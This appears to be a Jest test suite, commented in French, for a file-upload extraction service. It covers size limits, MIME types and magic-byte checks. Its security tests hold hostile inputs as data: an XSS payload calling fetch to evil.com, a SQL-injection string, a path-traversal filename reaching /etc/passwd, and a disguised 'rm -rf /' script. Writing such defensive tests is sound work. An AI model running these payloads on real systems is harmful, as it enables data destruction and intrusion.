/**
 * Agent 5 — Tests Complementaires : FileExtractionService
 *
 * Couvre les cas limites, tests de securite et branches non couvertes
 * par la suite TDD initiale.
 *
 * NOTE : Le service valide les magic bytes du contenu fichier.
 * Les tests d'extraction utilisent donc des buffers avec les bons magic bytes.
 */

import { describe, it, expect, beforeEach } from '@jest/globals'
import { FileExtractionService } from '@/lib/services/FileExtractionService'

jest.mock('pdf-parse/lib/pdf-parse.js', () => jest.fn())

// Mock mammoth
jest.mock('mammoth', () => ({
    extractRawText: jest.fn(),
}))

/** Helper : cree un buffer avec le magic bytes PDF (%PDF) */
function pdfBuffer(extraContent: string = '-1.4 fake content'): Buffer {
    return Buffer.from('%PDF' + extraContent)
}

/** Helper : cree un buffer avec le magic bytes DOCX (PK ZIP) */
function docxBuffer(extraContent: string = ' fake zip content'): Buffer {
    const buf = Buffer.alloc(4 + extraContent.length)
    buf[0] = 0x50 // P
    buf[1] = 0x4B // K
    buf[2] = 0x03
    buf[3] = 0x04
    buf.write(extraContent, 4)
    return buf
}

/** Helper : cree un buffer avec le magic bytes JPEG (FF D8 FF) */
function jpegBuffer(): Buffer {
    const buf = Buffer.alloc(16)
    buf[0] = 0xFF
    buf[1] = 0xD8
    buf[2] = 0xFF
    buf[3] = 0xE0 // JFIF marker
    return buf
}

/** Helper : cree un buffer avec le magic bytes PNG (89 50 4E 47) */
function pngBuffer(): Buffer {
    const buf = Buffer.alloc(16)
    buf[0] = 0x89
    buf[1] = 0x50 // P
    buf[2] = 0x4E // N
    buf[3] = 0x47 // G
    return buf
}

describe('FileExtractionService — Edge Cases & Security', () => {
    beforeEach(() => {
        jest.clearAllMocks()
    })

    // =========================================
    // VALIDATION — CAS LIMITES
    // =========================================

    describe('validateFile — boundary conditions', () => {
        it('devrait accepter un fichier de 1 octet (taille minimale)', () => {
            const file = new File(['x'], 'tiny.pdf', { type: 'application/pdf' })
            expect(() => FileExtractionService.validateFile(file)).not.toThrow()
        })

        it('devrait rejeter un fichier juste au-dessus de 20 MB (20 MB + 1 octet)', () => {
            const size = 20 * 1024 * 1024 + 1
            const buffer = new ArrayBuffer(size)
            const file = new File([buffer], 'over.pdf', { type: 'application/pdf' })
            expect(() => FileExtractionService.validateFile(file)).toThrow(
                'File exceeds the 20 MB limit.'
            )
        })

        it('devrait accepter le MIME type image/jpg (variante de image/jpeg)', () => {
            const file = new File(['img'], 'photo.jpg', { type: 'image/jpg' })
            expect(() => FileExtractionService.validateFile(file)).not.toThrow()
        })

        it('devrait rejeter un type MIME vide', () => {
            const file = new File(['data'], 'noext', { type: '' })
            expect(() => FileExtractionService.validateFile(file)).toThrow(
                'Unsupported file type. Use PDF, DOCX, or image.'
            )
        })

        it('devrait rejeter un script HTML deguise (.html)', () => {
            const file = new File(['<script>alert(1)</script>'], 'page.html', {
                type: 'text/html',
            })
            expect(() => FileExtractionService.validateFile(file)).toThrow(
                'Unsupported file type. Use PDF, DOCX, or image.'
            )
        })

        it('devrait rejeter un fichier SVG (vecteur potentiellement malveillant)', () => {
            const file = new File(['<svg></svg>'], 'image.svg', {
                type: 'image/svg+xml',
            })
            expect(() => FileExtractionService.validateFile(file)).toThrow(
                'Unsupported file type. Use PDF, DOCX, or image.'
            )
        })

        it('devrait rejeter un fichier ZIP', () => {
            const file = new File([Buffer.from('PK\x03\x04')], 'archive.zip', {
                type: 'application/zip',
            })
            expect(() => FileExtractionService.validateFile(file)).toThrow(
                'Unsupported file type. Use PDF, DOCX, or image.'
            )
        })

        it('devrait gerer un type MIME avec majuscules (case insensitive)', () => {
            const file = new File(['data'], 'test.pdf', {
                type: 'Application/PDF',
            })
            expect(() => FileExtractionService.validateFile(file)).not.toThrow()
        })

        it('devrait rejeter un fichier texte brut (.txt)', () => {
            const file = new File(['Hello world'], 'notes.txt', {
                type: 'text/plain',
            })
            expect(() => FileExtractionService.validateFile(file)).toThrow(
                'Unsupported file type. Use PDF, DOCX, or image.'
            )
        })
    })

    // =========================================
    // EXTRACTION — BRANCHES NON COUVERTES
    // =========================================

    describe('extractText — unsupported type in extractText itself', () => {
        it('devrait lancer une erreur pour un type non supporte dans extractText', async () => {
            const file = new File(['data'], 'test.xyz', { type: 'application/octet-stream' })
            await expect(FileExtractionService.extractText(file)).rejects.toThrow(
                'Unsupported file type. Use PDF, DOCX, or image.'
            )
        })
    })

    describe('extractText — magic bytes validation', () => {
        it('devrait rejeter un fichier PDF dont le contenu ne commence pas par %PDF', async () => {
            const file = new File([Buffer.from('NOT-PDF-CONTENT')], 'fake.pdf', {
                type: 'application/pdf',
            })
            await expect(FileExtractionService.extractText(file)).rejects.toThrow(
                'File content does not match declared type.'
            )
        })

        it('devrait rejeter un fichier DOCX dont le contenu ne commence pas par PK', async () => {
            const file = new File([Buffer.from('NOT-DOCX-CONTENT')], 'fake.docx', {
                type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            })
            await expect(FileExtractionService.extractText(file)).rejects.toThrow(
                'File content does not match declared type.'
            )
        })

        it('devrait rejeter une image JPEG dont le contenu n\'a pas les bons magic bytes', async () => {
            const file = new File([Buffer.from('NOT-JPEG')], 'fake.jpg', {
                type: 'image/jpeg',
            })
            await expect(FileExtractionService.extractText(file)).rejects.toThrow(
                'File content does not match declared type.'
            )
        })

        it('devrait rejeter un fichier avec buffer trop court (< 4 octets) pour PDF', async () => {
            const file = new File([Buffer.from('AB')], 'tiny.pdf', {
                type: 'application/pdf',
            })
            await expect(FileExtractionService.extractText(file)).rejects.toThrow(
                'File content does not match declared type.'
            )
        })

        it('devrait rejeter un fichier avec buffer trop court (< 4 octets) pour DOCX', async () => {
            const file = new File([Buffer.from('PK')], 'tiny.docx', {
                type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            })
            await expect(FileExtractionService.extractText(file)).rejects.toThrow(
                'File content does not match declared type.'
            )
        })

        it('devrait rejeter un fichier avec buffer trop court (< 4 octets) pour image', async () => {
            const file = new File([Buffer.from([0xFF, 0xD8])], 'tiny.jpg', {
                type: 'image/jpeg',
            })
            await expect(FileExtractionService.extractText(file)).rejects.toThrow(
                'File content does not match declared type.'
            )
        })

        it('devrait accepter un fichier DOC avec la signature compound document (D0 CF)', async () => {
            const mammoth = require('mammoth')
            mammoth.extractRawText.mockResolvedValue({ value: 'Compound doc content' })

            const buf = Buffer.alloc(20)
            buf[0] = 0xD0
            buf[1] = 0xCF
            buf[2] = 0x11
            buf[3] = 0xE0
            const file = new File([buf], 'old.doc', { type: 'application/msword' })

            const result = await FileExtractionService.extractText(file)

            expect(result.type).toBe('docx')
            expect(result.text).toBe('Compound doc content')
        })
    })

    describe('extractText — image/jpg MIME variant with proper magic bytes', () => {
        it('devrait convertir une image/jpg en base64 data URI', async () => {
            const file = new File([jpegBuffer()], 'photo.jpg', { type: 'image/jpg' })

            const result = await FileExtractionService.extractText(file)

            expect(result.type).toBe('image')
            expect(result.text).toMatch(/^data:image\/jpg;base64,/)
        })
    })

    describe('extractText — PDF with valid magic bytes', () => {
        it('devrait retourner du texte whitespace si le PDF ne contient que des espaces', async () => {
            const pdfParse = require('pdf-parse/lib/pdf-parse.js')
            pdfParse.mockResolvedValue({ text: '   \n\n   \t  ' })

            const file = new File([pdfBuffer()], 'whitespace.pdf', {
                type: 'application/pdf',
            })

            const result = await FileExtractionService.extractText(file)
            expect(result.text).toBe('   \n\n   \t  ')
            expect(result.type).toBe('pdf')
        })

        it('devrait retourner une chaine vide si pdf-parse retourne null/undefined pour text', async () => {
            const pdfParse = require('pdf-parse/lib/pdf-parse.js')
            pdfParse.mockResolvedValue({ text: null })

            const file = new File([pdfBuffer()], 'null.pdf', {
                type: 'application/pdf',
            })

            const result = await FileExtractionService.extractText(file)
            expect(result.text).toBe('')
            expect(result.type).toBe('pdf')
        })
    })

    describe('extractText — DOCX with valid magic bytes', () => {
        it('devrait retourner une chaine vide si mammoth retourne null/undefined pour value', async () => {
            const mammoth = require('mammoth')
            mammoth.extractRawText.mockResolvedValue({ value: null })

            const file = new File([docxBuffer()], 'empty.docx', {
                type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            })

            const result = await FileExtractionService.extractText(file)
            expect(result.text).toBe('')
            expect(result.type).toBe('docx')
        })
    })

    // =========================================
    // SECURITY TESTS — CONTENU MALVEILLANT
    // =========================================

    describe('Security — malicious content in extracted text', () => {
        it('devrait extraire le texte tel quel sans interpreter les balises HTML/XSS', async () => {
            const pdfParse = require('pdf-parse/lib/pdf-parse.js')
            const xssPayload = '<script>alert("XSS")</script><img onerror="fetch(\'http://evil.com\')" src=x>'
            pdfParse.mockResolvedValue({ text: xssPayload })

            const file = new File([pdfBuffer()], 'xss.pdf', {
                type: 'application/pdf',
            })

            const result = await FileExtractionService.extractText(file)
            expect(result.text).toBe(xssPayload)
            expect(result.type).toBe('pdf')
        })

        it('devrait extraire du texte contenant des caracteres SQL injection', async () => {
            const pdfParse = require('pdf-parse/lib/pdf-parse.js')
            const sqlPayload = "Robert'); DROP TABLE students;--"
            pdfParse.mockResolvedValue({ text: sqlPayload })

            const file = new File([pdfBuffer()], 'sql.pdf', {
                type: 'application/pdf',
            })

            const result = await FileExtractionService.extractText(file)
            expect(result.text).toBe(sqlPayload)
        })

        it('devrait gerer un contenu DOCX avec des caracteres unicode speciaux', async () => {
            const mammoth = require('mammoth')
            const unicodeText = 'Syllabus test \u202E\u200B'
            mammoth.extractRawText.mockResolvedValue({ value: unicodeText })

            const file = new File([docxBuffer()], 'unicode.docx', {
                type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            })

            const result = await FileExtractionService.extractText(file)
            expect(result.text).toBe(unicodeText)
            expect(result.type).toBe('docx')
        })

        it('devrait gerer une image PNG avec un nom de fichier contenant des path traversal', async () => {
            const maliciousName = '../../../etc/passwd.png'
            const file = new File([pngBuffer()], maliciousName, {
                type: 'image/png',
            })

            const result = await FileExtractionService.extractText(file)
            expect(result.type).toBe('image')
            expect(result.text).toMatch(/^data:image\/png;base64,/)
        })

        it('devrait detecter un .exe renomme en .pdf (magic bytes invalides)', async () => {
            // Un EXE Windows commence par MZ, pas %PDF
            const exeHeader = Buffer.from([0x4D, 0x5A, 0x90, 0x00])
            const file = new File([exeHeader], 'malware.pdf', {
                type: 'application/pdf',
            })

            await expect(FileExtractionService.extractText(file)).rejects.toThrow(
                'File content does not match declared type.'
            )
        })

        it('devrait detecter un script renomme en .docx (magic bytes invalides)', async () => {
            const scriptContent = Buffer.from('#!/bin/bash\nrm -rf /')
            const file = new File([scriptContent], 'payload.docx', {
                type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            })

            await expect(FileExtractionService.extractText(file)).rejects.toThrow(
                'File content does not match declared type.'
            )
        })
    })

    // =========================================
    // PERFORMANCE TESTS
    // =========================================

    describe('Performance — validateFile', () => {
        it('devrait valider 10000 fichiers en moins de 200ms', () => {
            const files: File[] = []
            for (let i = 0; i < 10000; i++) {
                files.push(new File(['x'], `test${i}.pdf`, { type: 'application/pdf' }))
            }

            const start = Date.now()
            for (const file of files) {
                FileExtractionService.validateFile(file)
            }
            const elapsed = Date.now() - start

            expect(elapsed).toBeLessThan(200)
        })
    })
})
